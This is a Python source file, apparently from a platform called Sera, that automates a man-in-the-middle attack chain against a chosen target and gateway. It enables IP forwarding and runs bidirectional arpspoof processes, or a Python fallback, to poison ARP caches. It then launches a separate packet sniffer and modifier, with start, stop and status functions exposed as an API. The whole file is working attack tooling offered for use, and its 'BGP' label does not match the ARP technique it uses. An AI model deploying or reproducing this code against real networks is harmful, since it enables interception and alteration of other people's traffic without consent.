#!/usr/bin/env python3
"""
full_attack.py - Full automation of BGP MITM attack chain
MERGED FROM JULIUS → SERA PLATFORM
"""

import subprocess
import time
import sys
import os
import signal
import logging
import json
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, Any

# Add Sera paths
SERA_ROOT = Path(__file__).parent.parent.parent
sys.path.insert(0, str(SERA_ROOT))

# Sera-specific imports
try:
    from config import settings
    SERA_CONFIG = settings
except ImportError:
    SERA_CONFIG = None

# Setup Sera logging
LOG_DIR = SERA_ROOT / "logs"
LOG_DIR.mkdir(exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_DIR / 'sera_full_attack.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("sera_full_attack")

class SeraFullAttack:
    """Full attack chain with Sera integration"""
    
    def __init__(self):
        self.is_running = False
        self.processes = []
        self.attack_history = []
        self.current_attack = None
        
        # Sera components
        self.db = self._init_database()
        self.auth = self._init_auth()
        self.audit = self._init_audit()
        
        logger.info("Sera Full Attack initialized")
    
    def _init_database(self):
        """Initialize Sera database"""
        try:
            from database.db import get_db
            return get_db()
        except ImportError:
            logger.warning("Database not available - using memory storage")
            return None
    
    def _init_auth(self):
        """Initialize Sera authentication"""
        try:
            from security.auth import get_current_user
            return get_current_user
        except ImportError:
            logger.warning("Auth not available - development mode")
            return None
    
    def _init_audit(self):
        """Initialize Sera audit logging"""
        try:
            from services.audit_service import log_activity
            return log_activity
        except ImportError:
            logger.warning("Audit service not available - using local logging")
            return None
    
    def enable_ip_forwarding(self) -> bool:
        """Enable IP forwarding for MITM"""
        try:
            if sys.platform == "win32":
                # Windows: This is more complex - just log a warning
                logger.warning("IP forwarding on Windows requires manual configuration")
                return False
            else:
                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
                logger.info("IP forwarding enabled")
                return True
        except Exception as e:
            logger.error(f"Failed to enable IP forwarding: {e}")
            return False
    
    def run_attack(self, target: str, gateway: str, interface: str = "eth0",
                   user_id: Optional[str] = None) -> Dict[str, Any]:
        """Run full attack chain"""
        if self.is_running:
            return {"status": "error", "message": "Attack already running"}
        
        logger.info("=" * 60)
        logger.info("BGP MITM - Full Attack Chain")
        logger.info(f"Target: {target}, Gateway: {gateway}, Interface: {interface}")
        logger.info("=" * 60)
        
        # Store attack info
        self.current_attack = {
            "target": target,
            "gateway": gateway,
            "interface": interface,
            "started_at": datetime.now().isoformat(),
            "user_id": user_id or "system",
            "status": "starting"
        }
        
        # Audit log
        self._log_attack_start()
        
        # Enable IP forwarding
        if not self.enable_ip_forwarding():
            logger.warning("IP forwarding not enabled - MITM may not work")
        
        try:
            logger.info("Starting ARP spoofing...")
            
            # Try arpspoof first
            try:
                p1 = subprocess.Popen(["arpspoof", "-i", interface, "-t", target, gateway],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                p2 = subprocess.Popen(["arpspoof", "-i", interface, "-t", gateway, target],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.processes.extend([p1, p2])
                logger.info("ARP spoofing started")
            except FileNotFoundError:
                logger.warning("arpspoof not found - using Python ARP spoofing")
                # Use Python ARP spoofing fallback
                from .arp_spoof import start_arp_spoof
                start_arp_spoof(target, gateway, interface, user_id)
            
            time.sleep(2)
            
            logger.info("Starting packet sniffer and modifier...")
            self.is_running = True
            self.current_attack["status"] = "running"
            self.attack_history.append(self.current_attack)
            
            # Try to run packet sniffer
            try:
                script_dir = Path(__file__).parent
                sniffer_path = script_dir / "packet_sniffer.py"
                if sniffer_path.exists():
                    subprocess.Popen(["python3", str(sniffer_path)],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                else:
                    logger.warning("packet_sniffer.py not found")
            except Exception as e:
                logger.error(f"Error starting packet sniffer: {e}")
            
            return {
                "status": "running",
                "target": target,
                "gateway": gateway,
                "interface": interface,
                "message": "Full attack chain started"
            }
            
        except Exception as e:
            logger.error(f"Attack failed: {e}")
            self.current_attack["status"] = "failed"
            return {"status": "failed", "error": str(e)}
    
    def stop_attack(self) -> Dict[str, Any]:
        """Stop all attack processes"""
        logger.info("Stopping all processes...")
        
        for p in self.processes:
            try:
                p.terminate()
            except:
                pass
        
        self.is_running = False
        self.processes = []
        
        if self.current_attack:
            self.current_attack["status"] = "stopped"
            self.current_attack["stopped_at"] = datetime.now().isoformat()
            self._log_attack_stop()
        
        logger.info("Cleanup complete")
        return {"status": "stopped", "message": "All processes terminated"}
    
    def _log_attack_start(self):
        """Log attack start to Sera audit"""
        try:
            if self.audit:
                self.audit(
                    action="full_attack_start",
                    target=self.current_attack["target"],
                    details=self.current_attack
                )
            else:
                audit_file = LOG_DIR / f"full_attack_{datetime.now().strftime('%Y%m%d')}.log"
                with open(audit_file, 'a') as f:
                    f.write(json.dumps({
                        "action": "start",
                        "target": self.current_attack["target"],
                        "timestamp": self.current_attack["started_at"]
                    }) + '\n')
        except Exception as e:
            logger.error(f"Error logging attack start: {e}")
    
    def _log_attack_stop(self):
        """Log attack stop to Sera audit"""
        try:
            if self.audit:
                self.audit(
                    action="full_attack_stop",
                    target=self.current_attack["target"],
                    details=self.current_attack
                )
        except Exception as e:
            logger.error(f"Error logging attack stop: {e}")
    
    def get_status(self) -> Dict[str, Any]:
        """Get attack status"""
        return {
            "is_running": self.is_running,
            "current_attack": self.current_attack,
            "total_attacks": len(self.attack_history)
        }

# Singleton
_attack_instance = None

def get_attack_instance() -> SeraFullAttack:
    global _attack_instance
    if _attack_instance is None:
        _attack_instance = SeraFullAttack()
    return _attack_instance

# Sera API Functions
def run_full_attack(target: str, gateway: str, interface: str = "eth0",
                   user_id: Optional[str] = None) -> Dict[str, Any]:
    attack = get_attack_instance()
    return attack.run_attack(target, gateway, interface, user_id)

def stop_full_attack() -> Dict[str, Any]:
    attack = get_attack_instance()
    return attack.stop_attack()

def get_attack_status() -> Dict[str, Any]:
    attack = get_attack_instance()
    return {"status": "success", "data": attack.get_status()}

if __name__ == "__main__":
    print("Sera Full Attack loaded")
